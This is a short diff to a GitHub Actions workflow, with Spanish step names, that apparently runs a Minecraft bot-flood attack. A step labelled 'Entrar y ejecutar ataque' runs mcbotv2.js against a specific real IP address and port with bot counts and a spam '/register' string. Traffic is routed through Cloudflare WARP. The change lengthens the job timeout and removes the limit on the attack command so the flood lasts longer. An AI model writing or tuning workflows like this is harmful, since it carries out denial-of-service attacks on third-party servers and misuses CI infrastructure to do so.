@@ -5,7 +5,7 @@ on:
 jobs:
   anak:
     runs-on: ubuntu-latest
-    timeout-minutes: 2
+    timeout-minutes: 5
     
     steps:
       - name: Instalar y activar Cloudflare WARP
@@ -37,7 +37,7 @@ jobs:
       - name: Entrar y ejecutar ataque
         run: |
           cd ssh2
-          timeout 25 node mcbotv2.js 131.196.198.112 25575 13444 15 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
+          node mcbotv2.js 131.196.198.112 25575 13444 15 "/register hawia*sna|Hoaolsozozosiaoaoaooakamlwosmskoslsloskksksksk" 2
           
       - name: Limpiar
         if: always()
